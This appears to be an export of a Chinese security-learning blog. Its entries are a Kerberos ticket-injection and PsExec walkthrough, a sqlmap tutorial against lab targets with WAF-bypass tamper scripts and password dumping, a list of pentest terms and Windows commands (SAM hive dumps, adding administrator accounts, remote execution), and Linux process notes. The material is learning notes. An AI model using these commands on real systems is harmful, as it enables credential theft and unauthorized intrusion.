src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689575384514-10e5b4d4-69ff-4879-8907-868de53e7bf8.png" alt="image.png"></p><p><strong>三.使用猕猴桃导入票据</strong><br>mimikatz **# kerberos::purge &#x2F;&#x2F;清空票据 **<br>mimikatz <strong># kerberos::ptc 票据文件地址</strong><br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689575429514-c946e55b-fd37-4094-8ce4-4df4c6c9336a.png" alt="image.png"></p><p><strong>这时候就已经成功了，可以获取到域控c盘的目录</strong><br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689575507261-80eda55a-a384-4141-9c56-80e8f7ae8f86.png" alt="image.png"></p><p>PsExec64.exe \08server-dc.moonsec.fbi cmd.exe反弹shell<br>已经是域控的ip了<br><img src="/2024/03/14/%E5%9F%9F%E5%AE%89%E8%A3%85-2008server/1689575847557-5fc25be8-c388-4e74-8fae-5ac4b7b7318a.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-netcoding</title>
      <link href="/2024/03/14/python-netcoding/"/>
      <url>/2024/03/14/python-netcoding/</url>
      
        <content type="html"><![CDATA[<h1 id="python网络编程"><a href="#python网络编程" class="headerlink" title="python网络编程"></a>python网络编程</h1><h3 id="并发编程"><a href="#并发编程" class="headerlink" title="并发编程"></a>并发编程</h3><h4 id="并发编程介绍"><a href="#并发编程介绍" class="headerlink" title="并发编程介绍"></a>并发编程介绍</h4><p><img src="/2024/03/14/python-netcoding/1.png" alt="截屏2024-03-13 21.00.25"></p><p>串行：一个cpu上，依次按顺序执行任务</p><p>并行：指的是任务数小图等于cpu<strong>核数</strong>，即任务真的是一起执行的</p><p>并发：一个cpu采用时间片管理方式，交替的处理多个任务，一般是任务数多余cpu核数，通过操作系统的各种任务调度算法，实现多个任务“一起”执行(实际上总有些任务不在执行，因为任务切换的速度相当快，看上去是一起执行而已)</p><p><img src="/2024/03/14/python-netcoding/2.png" alt="截屏2024-03-13 21.15.30"></p><p> <img src="/2024/03/14/python-netcoding/3.png" alt="截屏2024-03-13 21.15.30"></p><p><img src="/2024/03/14/python-netcoding/4.png" alt="截屏2024-03-13 21.16.41"></p><p><img src="/2024/03/14/python-netcoding/5.png" alt="截屏2024-03-13 22.01.41"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h3>]]></content>
      
      
      <categories>
          
          <category> 语言学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap工具使用</title>
      <link href="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>实例 sqlmap -u “<a href="http://192.168.77.134/06/vul/sqli/sqli_str.phpname=qq&submit=%E6%9F%A5%E8%AF%A2">http://192.168.77.134/06/vul/sqli/sqli_str.phpname=qq&amp;submit=%E6%9F%A5%E8%AF%A2</a>“ -v 1<br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686627209906-07625238-f461-4e7f-9466-8b2b0d3d6656.png" alt="image.png"></p><p>-v  请求等级 越高显示越详细<br>​<br>使用burp抓包<br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686627749802-68a08df3-df2f-4f02-a2e6-1244d4723215.png" alt="image.png"></p><p>保存为1.txt<br>sqlmap -r  1.txt  效果与-u一样，在对个http请求中适合</p><p>在测试时发生302跳转<br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686634037124-89185ad0-f1df-44ea-83fb-7d0b6349286f.png" alt="image.png"></p><p>使用security&#x3D;low; PHPSESSID&#x3D;e5lgaail00teo28qva44qhlrc4<br><strong>sqlmap -u “</strong><a href="http://192.168.77.134/01/vulnerabilities/sqli/?id=1&Submit=Submit#%22"><strong>http://192.168.77.134/01/vulnerabilities/sqli/?id=1&Submit=Submit#"</strong></a>** -v 1 –cookie&#x3D;”security&#x3D;low; PHPSESSID&#x3D;e5lgaail00teo28qva44qhlrc4”**<br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686634832124-f35dc68a-552c-49b7-9bd0-f06764f168ab.png" alt="image.png"></p><p><strong>SQLMAP渗透测试实战技巧一</strong><br><strong>检测注入</strong><br>检测URL GET参数的是否存在注入<br>-u 检测的url<br>“”双引号 表示这是一段字符串<br>–dbms 指定攻击的数据引擎<br>-v 输出信息登记为1<br><strong>sqlmap -u “<a href="http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2">http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2</a>“ –dbms mysql -v 1</strong><br><strong>输入之后sqlmap会自动进行注入，但是会有一些进行提示 需要你在终端进行确认 如果使用–batch 会自动进行默认操作，不用进行交互信息确定</strong><br><strong>sqlmap -u “<a href="http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2">http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2</a>“ –dbms mysql -v 1 –batch</strong><br><strong>–dbms mysql</strong><br><strong>​</strong><br><strong>获取敏感信息</strong><br>确定存在注入之后 接着通过获取敏感信息命令 获取<br>–current-user 用户连接的用户<br>–currnet-db 当前库<br>–is-dba 是否root权限<br>–passwords 获取数据库的密码 使用这个命令 sqlmap找到密文时，会提示你是否进行hash破解 如果需要选择合适的字典。<br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686635804483-212be128-659f-4301-908a-e738820710f8.png" alt="image.png"></p><p><strong>获取所有库</strong><br><strong>sqlmap -u “<a href="http://192.168.0.165/06/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2">http://192.168.0.165/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2</a>“ -v 1 –dbms mysql –batch –dbs</strong><br><strong>​</strong><br><strong>获取表</strong><br>在获取当前库、可以根据库列出表。<br>-D 指定库<br>–tables 列出所有表<br><strong>sqlmap -u “<a href="http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2">http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2</a>“ –dbms mysql -v 1 -D pikachu –tables</strong><br><strong>获取piachu数据库中所有表与列</strong><br><strong>sqlmap -u “</strong><a href="http://192.168.77.134/06/vul/sqli/sqli_str.php?name=qq&submit=%E6%9F%A5%E8%AF%A2%22"><strong>http://192.168.77.134/06/vul/sqli/sqli_str.php?name&#x3D;qq&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2”</strong></a>** -v 1 –dbms mysql -D pikachu –tables –columns  –batch**<br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686636401745-edc8621f-0a9c-41d2-95bb-141188dff0d7.png" alt="image.png"><br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686636418953-05fa1b56-5919-4e46-8fcd-95aefb41fab3.png" alt="image.png"></p><p>指定某个表中的列   -T<br>获取所有内容                –dump-all<br>获取指定内容 ** **-C “username,password”  –dump<br>获取总条数                      –count<br>获取指定条数                  –start 1 –stop 3<br>​<br>​</p><p><strong>SQLMAP渗透测试实战技巧二</strong><br><strong>–technique 使用指定的注入方式</strong><br>在一些实战项目中，难免会遇上 网络反应缓慢，idc还有检测sqlmap的能力，所以作为一个专业的渗透测试人员，必须做到快准狠。<br>有些SQL注入点 只允许时间注入，这时指定SQLMAP的注入类型为T<br>以下是–technique 参数的值的解释<br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686636902716-ce56536b-2f5f-4daf-90b0-bb7197959b1b.png" alt="image.png"></p><p><strong>使用基于时间的延时注入</strong><br><strong>sqlmap -u “<a href="http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2">http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2</a>“ –dbms mysql -v 3 -D pikachu –technique&#x3D;T</strong><br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686637063300-adde2981-2789-4417-b0ae-d40698b925a1.png" alt="image.png"></p><p><strong>设置超时时间</strong><br>–time-out 这个参数是设置超时时间 有得网页响应比较慢，可以使用这个参数来增大访问超时的时间。默认是30<br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686637136484-edb0bc27-a5c8-408f-803f-f5fddf15ce22.png" alt="image.png"></p><p><strong>读取文本进行SQL注入检测</strong><br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686637167142-48ea5b78-98f3-4dc5-b714-775df6113b6b.png" alt="image.png"></p><p><strong>指定参数进行注入</strong><br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686637381160-2fac0d04-ef07-419c-8af0-e3613a6b7f65.png" alt="image.png"></p><p>cookie注入<br>–cookie 输入cookie的请求参数<br>–level 3或者以上才进行cookie注入<br><strong>sqlmap.py -u “<a href="http://192.168.87.129/shownews.asp">http://192.168.87.129/shownews.asp</a>“ –cookie “id&#x3D;27” –dump -T admin -C “user,password” –level 3</strong><br><strong>​</strong><br><strong>SQLMAP渗透测试实战技巧三</strong><br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686637570978-de8c3c69-b53a-420d-9f57-ee4b37c3d992.png" alt="image.png"></p><p>**sqlmap.py -u “<a href="http://192.168.87.129/shownews.asp">http://192.168.87.129/shownews.asp</a>“ –cookie “id&#x3D;27” –dump -T admin -C “user,password”  ****–thread&#x3D;10**<br><strong>​</strong><br>**SQLMAP渗透测试实战技巧四 **<strong>绕过防火墙拦截</strong><br>目前很多网站都使用waf对网站进行保护，在渗透测试过程中，很多的操作都会被拦截，在测试SQL注入时，waf会对请求过来的流量进行拦<br>截，导致SQLMAP请求的内容无法到达目标，SQLMAP无法判断目标是否存在注入，waf对恶意的攻击请求进行拦截，拦截会拉入黑名单，<br>导致攻击者访问不到目标。无法进行安全检测。<br>sqlmap使用–tamper命令 选择合适的脚本对waf进行绕过<br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686638192456-bde8b2f4-a9eb-4aad-9067-704301e0b047.png" alt="image.png"></p><p><strong>宽字节注入</strong><br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686638254881-2ddd9a2f-5014-4389-96a6-a202d18bd2df.png" alt="image.png"></p><p><strong>base64注入</strong><br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686638400473-78dafc3b-4141-4536-bcd8-3dd56cd6a933.png" alt="image.png"></p><p>–param-del&#x3D;”;” 用;分割参数<br><strong>设置线程大小</strong><br>在遇到waf的时候，如果并发过大，会认为是cc攻击，ip会被封堵<br>–threads&#x3D;1 设置线程为1<br><strong>设置http请求延时</strong><br>–delay&#x3D;DELAY 设置每个 HTTP 请求的延迟秒数<br><strong>使用代理注入</strong><br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686639391180-37fb6746-587a-4607-af62-f415d79d75c5.png" alt="image.png"></p><p><strong>–proxy-file 从文件中加载代理列表</strong><br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686641666818-dc64df3d-6308-47e6-be27-ec6054f2ad3a.png" alt="image.png"></p><p>**SQLMAP渗透测试实战技巧五 **<strong>命令执行 文件读写 dns盲注</strong><br><strong>sqlmap命令执行</strong><br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686649841560-afbb4b2b-cab6-4133-aaf5-044e79bc94f7.png" alt="image.png"></p><p><strong>读取和写入文件</strong><br>–file-read 读取文件 读取文件首先要知道路径,才能读取<br><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686649943345-e8d0b359-9ec4-459c-945e-ffdceddbd4c9.png" alt="image.png"></p><p><img src="/2024/03/14/Sqlmap%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/1686649964863-0189c66c-5105-4014-8f26-96978726a010.png" alt="image.png"></p><p><strong>sqlmap dnslog注入</strong><br>这种情况适合使用没有回显的时，使用注入把数据发送到远程dnslog上。<br> –sql-shell 调用 sql交互shell<br><strong>sqlmap –dns-domain 注入</strong><br><strong>​</strong><br><strong>编写tamper模块绕过waf拦截继续注入</strong><br><strong>首先判断 waf的厂商 新版的sqlmap会自动去执行waf检测</strong><br>sqlmap -u <a href="http://www.p2.com/inj.aspx?id=1">http://www.p2.com/inj.aspx?id=1</a> -v 1 –random-agent<br><strong>使用联合查询注入检测，随机浏览器 默认会被安全狗拦截</strong><br><strong>sqlmap.py -u <a href="http://www.p2.com/inj.aspx?id=1">http://www.p2.com/inj.aspx?id=1</a> –dbms&#x3D;”MSSQL” –tamper bypass_safedog_msql.py -v 4 –flush</strong><br>**session –batch –tech&#x3D;U –random-agent –dbs ****–display  5 **<br><strong>使用–display 5 防止检测到cc攻击</strong><br><strong>​</strong><br><strong>sqlmap 暴力穷举表字段</strong><br>在access和mysql4.0数据库 没有内置库，针对这类数据库sqlmap使用字典穷举的方法对表进行猜解。<br>sqlmap内置表和字段的字典<br><strong>sqlmap -u <a href="http://www.dm3.com/Content.asp?id=9">http://www.dm3.com/Content.asp?id=9</a> –dbms access –threads&#x3D;10 –tables</strong><br><strong>​</strong><br><strong>​</strong></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试基础</title>
      <link href="/2024/03/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/03/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>常见的漏洞术语<strong>肉鸡</strong><br><strong>木马</strong><br><strong>远控</strong><br><strong>网页木马</strong><br><strong>黑页</strong><br><strong>挂马</strong><br><strong>大马</strong><br><strong>小马</strong><br><strong>一句话后门</strong><br><strong>后门</strong><br><strong>拖库</strong>（黑客将数据库的数据导出）<br><strong>社工库</strong><br><strong>撞库</strong><br><strong>提权</strong><br><strong>网络钓鱼</strong><br><strong>社会工程学攻击</strong><br><strong>rootkit</strong>：rookit是攻击者用来隐藏自己的行踪和保留root<br>**IPC$**：是共享命令管道的资源，他是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机共享资源时使用<br><strong>弱口令</strong><br><strong>shell</strong><br><strong>webshell</strong>：以asp,php,jsp,或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称作是一种网页后门。黑客在入侵了网站之后，通常会将这些asp或者php后门文件与网站服务器WEB目录下正常的网页文件混在一起，就可以使用浏览器访问这些文件，以达到控制网站服务器的目的。可以上传下载文件，查看数据库<br><strong>旁站入侵：</strong>同一个服务器上有多个站点，可以通过入侵其中一个站点，可以通过提权跨目录访问其他站点<br><strong>c段渗透：</strong>c段下，同一个网段内如202.202.0.1-202.202.0.254 如果拿下其中一台服务器，通过这台服务器嗅探目标服务器传输上的数据，从而获取服务器的权限，常见的工具有cain<br><strong>内网：</strong>10.0.0.0-10.255.255.255  172.16.0.0-172.31.255.255  192.168.0.0-192.168.255.255<br><strong>加壳</strong><br><strong>花指令：</strong>就是几句汇编指令，让汇编语句进行一些跳转，使得杀毒软件不能正常的判断病毒文件的构造<br><strong>蜜罐：</strong>好比是情报收集系统。蜜罐好像是故意让人攻击的目标，引诱黑客来攻击，所以攻击者攻击后，你就知道他是如何得逞的。随时了解针对你的服务器发动的最新的攻击和漏洞，还可以通过窃听黑客之间的联系。<br><strong>ddos</strong><br><strong>cc攻击：</strong>实现ddos和伪装<br><strong>APR攻击</strong><br><strong>0day：</strong>0day漏洞是指负责应用程序的程序员或供应商所未知的软件缺陷。因为该漏洞未知，所以没由可用的补丁程序<br><strong>1day：</strong>刚发布，但是已被发现官方刚发布的补丁网络上还存在着大量的漏洞<br><strong>Nday：</strong>已经被公布出来的0day<br>​<br>渗透测试-信息收集渗透的本质是信息收集  ，信息收集也叫做资产收集<br>信息收集是渗透测试的前期主要工作，是非常重要的环节，收集足够多的信息才能方便接下来的测试，信息收集主要是收集网站的域名信息、子域名信息、目标网站信息、目标网站真实IP、敏感&#x2F;目录文件、开放端口和中间件信息等等。通过各种渠道和手段尽可能收集到多的关于这个站点的信息，有助于我们更多的去找到渗透点，突破口。<br>​<br><strong>信息收集的分类：</strong></p><ol><li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li><li>网站指纹识别（包括，cms，cdn，证书等） dns记录</li><li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li><li>子域名收集，旁站，C段等</li><li>google hacking针对化搜索，word&#x2F;电子表格&#x2F;pdf文件，中间件版本，弱口令扫描等</li><li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li><li>传输协议，通用漏洞，exp，github源码等<br>​<br>渗透测试-常用Windows命令ifconfig &#x2F;all 获取获取域名、IP地址、DHCP服务器、网关、MAC地址、主机名<br>net time &#x2F;domain 查看域名、时间<br>net view &#x2F;domain 查看域内所有共享<br>net view ip 查看对方局域网内开启了哪些共享<br>net config workstation 查看域名、机器名等<br>net user 用户名 密码 &#x2F;add 建立用户<br>net user 用户名 &#x2F;del #删除用户<br>net user guest &#x2F;active:yes 激活guest账户<br>net user 查看账户<br>net user 账户名 查看指定账户信息<br>net user &#x2F;domain 查看域内有哪些用户，Windows NT Workstation 计算机上可用，由此可以此判断用户是否是域成员。<br>net user 用户名 &#x2F;domain 查看账户信息<br>net group &#x2F;domain 查看域中的组<br>net group “domain admins” &#x2F;domain 查看当前域的管理用户<br>query user 查看当前在线的用户<br>net localgroup 查看所有的本地组<br>net localgroup administrators 查看administrators组中有哪些用户<br>net localgroup administrators 用户名 &#x2F;add 把用户添加到管理员组中<br>net start 查看开启服务<br>net start 服务名 开启某服务<br>net stop 服务名 停止某服务<br>net share 查看本地开启的共享<br>net share ipc$ 开启ipc$共享<br>net share ipc$ &#x2F;del 删除ipc$共享<br>net share c$ &#x2F;del 删除C：共享<br>\192.168.0.108\c 访问默认共享c盘<br>dsquery server 查看所有域控制器<br>dsquery subnet 查看域内内子网<br>dsquery group 查看域内工作组<br>dsquery site 查看域内站点<br>netstat -a 查看开启了哪些端口,常用netstat -an<br>netstat -n 查看端口的网络连接情况，常用netstat -an<br>netstat -v 查看正在进行的工作<br>netstat -p 协议名 例：netstat -p tcq&#x2F;ip 查看某协议使用情况（查看tcp&#x2F;ip协议使用情况）<br>netstat -s 查看正在使用的所有协议使用情况<br>nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写<br>reg save hklm\sam sam.hive 导出用户组信息、权限配置<br>reg save hklm\system system.hive 导出SYSKEY<br>net use \目标IP\ipc$ 密码 &#x2F;u:用户名 连接目标机器<br>at \目标IP 21:31 c:\server.exe 在某个时间启动某个应用<br>wmic &#x2F;node:”目标IP” &#x2F;password:”123456” &#x2F;user:”admin” 连接目标机器<br>psexec.exe \目标IP -u username -p password -s cmd 在目标机器上执行cmd<br>finger username @host 查看最近有哪些用户登陆<br>route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface<br>arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。<br>arp -a 将显示出全部信息<br>nslookup IP地址侦测器<br>tasklist 查看当前进程<br>taskkill &#x2F;pid PID数 终止指定PID进程<br>whoami 查看当前用户及权限<br>systeminfo 查看计算机信息（版本，位数，补丁情况）<br>ver 查看计算机操作系统版本<br>tasklist &#x2F;svc 查看当前计算机进程情况<br>netstat -ano 查看当前计算机进程情况<br>wmic product &gt; ins.txt 查看安装软件以及版本路径等信息，重定向到ins.txt<br>​<br>渗透测试-常用编码</li></ol><embed src="/渗透测试中的常用编码.pdf" type="application/pdf" width="100%" height="100%"><p>渗透测试-http</p><p><img src="/2024/03/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/netconncet/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80.assert/1686573674182-c5221535-70c3-4841-a492-5d5b7e004334.png" alt="http.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux</title>
      <link href="/2024/03/13/Linux/"/>
      <url>/2024/03/13/Linux/</url>
      
        <content type="html"><![CDATA[<p>linux系统文件架构以及相应文件功能说明<br>文件IO与进程<strong>获取文件状态函数fcntl</strong><br><strong>错误处理函数</strong><br><strong>1.strerror(errno)    传入错误码转换成相应的错误信息</strong><br><strong>2.perror(“fopen err”)  打印错误原因的字符串</strong><br><strong>​</strong><br><strong>虚拟地址空间</strong><br><strong>32位机器，该地址空间为4G</strong><br><img src="/2024/03/13/Linux/1686211568855-c2bb53d1-b5fd-4aa5-9bc7-bdfb2063a013.png" alt="image.png"></p><p><strong>文件描述符</strong><br><img src="/2024/03/13/Linux/1686212395299-529bf8cb-9dd0-4ef2-ae7a-490cceeecbc9.png" alt="image.png"></p><p><strong>程序与进程</strong><br><strong>我们平时写的c语言代码，通过编译器编译，最终他会成为一个可执行进程，当这个可执行程序运行起来后，他就成为了一个进程</strong><br><strong>程序是存放在存储介质上的可执行文件，而进程是程序执行的过程，进程的状态是变化的，其包括进程的创建，调度，消亡</strong><br><strong>cpu分配资源的最小单位是进程</strong></p><hr><p><strong>并行：指在同一时刻，有多条指令在多个处理器上同时运行</strong><br><img src="/2024/03/13/Linux/1686213064677-3426ab6d-9a67-4fae-b864-089254649d10.png" alt="image.png"></p><p><strong>并发：指在同一时刻只能有一条指令执行，但多个进程指令被快速的轮转执行，使得在宏观上具有多个进程同时执行的效果，但在微观上并不是同时执行的，只是把时间分成若干段，使多个进程快速交替的执行</strong><br><img src="/2024/03/13/Linux/1686213088754-688058ac-c88b-4d8b-a8c3-31ee53d1dfad.png" alt="image.png"></p><p><strong>MMU（内存管理单元）:管理虚拟存储器，物理存储器的控制线路，虚拟地址映射为物理地址，提供硬件机制的内存访问</strong><br><strong>进程控制块(PCB)</strong><br><strong>进程运行时，内核为每一个进程分配一个PCB，维护进程相关的信息，Linux内核的进程控制块是task_stack结构体</strong><br><img src="/2024/03/13/Linux/1686213502823-f3164b48-9859-43ab-a74d-1e8ad694ed6e.png" alt="image.png"></p><p><strong>与进程相关的命令</strong><br><strong>ps top kill killall</strong><br><strong>与进程相关的函数</strong><br><strong>getpid()   grtpgid(pid)</strong><br><strong>​</strong><br><strong>进程的创建</strong><br><strong>头文件 &lt;sys&#x2F;types.h&gt;</strong><br>**            &lt;unistd.h&gt;**<br><strong>​</strong><br><strong>pid_t fork(void);     用于从一个已存在的进程中创建一个新进程</strong><br><strong>​</strong><br><strong>父子进程数据遵循****读时共享，写时拷贝</strong><br><strong>区分父子进程</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//区分父子进程</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    pid_t pid = -1;</span><br><span class="line">    //创建一个子进程</span><br><span class="line">    pid = fork();</span><br><span class="line">    if(pid == 0)</span><br><span class="line">    &#123;</span><br><span class="line">        //子进程</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      //父进程</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/13/Linux/1686231433980-9392479c-7fa5-4c45-9bdb-fba453657ef9.png" alt="image.png"></p><p>在父进程中创建子进程返回子进程的id，但在子进程中返回0</p><p><strong>父子进程的地址空间</strong><br><img src="/2024/03/13/Linux/1686231854140-843ac560-1ada-4bea-ac99-e7147bee66b3.png" alt="image.png"></p><p><strong>父子进程堆空间</strong><br><strong>查看内存泄露 valgrind .&#x2F;1.out</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">int num =100;</span><br><span class="line">int main()</span><br><span class="line">&#123;  int var =88;</span><br><span class="line">   int *p = malloc(sizeof(int));</span><br><span class="line">   memset(p,0,sizeof(int);</span><br><span class="line"></span><br><span class="line">   *p = 200;</span><br><span class="line"></span><br><span class="line">    //创建一个子进程</span><br><span class="line">    pid_t  pid = fork();</span><br><span class="line"></span><br><span class="line">    if(pid==-1)</span><br><span class="line">    &#123;</span><br><span class="line">    perror(<span class="string">&quot;fork fail&quot;</span>);</span><br><span class="line">    return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(pid == 0)</span><br><span class="line">    &#123;</span><br><span class="line">      //子进程</span><br><span class="line">      sleep(1);</span><br><span class="line">      printf(<span class="string">&quot;子进程睡醒之后 *p=%d num = %d var=%d\n&quot;</span>,*p,num,var);</span><br><span class="line">      free(p);</span><br><span class="line">      p = NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      //父进程</span><br><span class="line">      printf(<span class="string">&quot;父进程之前 *p = %d num = %d var=%d\n&quot;</span>,*p,num,var);</span><br><span class="line">      var++;</span><br><span class="line">      num++;</span><br><span class="line">      (*p)++;</span><br><span class="line">      printf(<span class="string">&quot;父进程之后 *p = %d num = %d var=%d\n&quot;</span>,*p,num,var);</span><br><span class="line">      free(p);</span><br><span class="line">      p=NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>GDB调试多进程</strong><br><strong>set follow-fork-mode child 跟踪子进程</strong><br><strong>set folloe-fork-mode parent 跟踪父进程</strong><br><strong>​</strong><br><strong>进程退出函数</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">void exit(int status);  //标准库函数</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">void _exit(int status);  //系统调用</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><strong>等待子进程退出函数</strong><br><strong>wait()和waitpid()函数的功能一样，区别在于，wait()函数会阻塞，waitpid()可以设置不阻塞，waitpid()还可以指定等待那个子进程结束</strong><br>注意:一次wait或waitpid调用只能清理一个子进程，清理多个子进程应使用循环<br>​<br><strong>wait函数</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 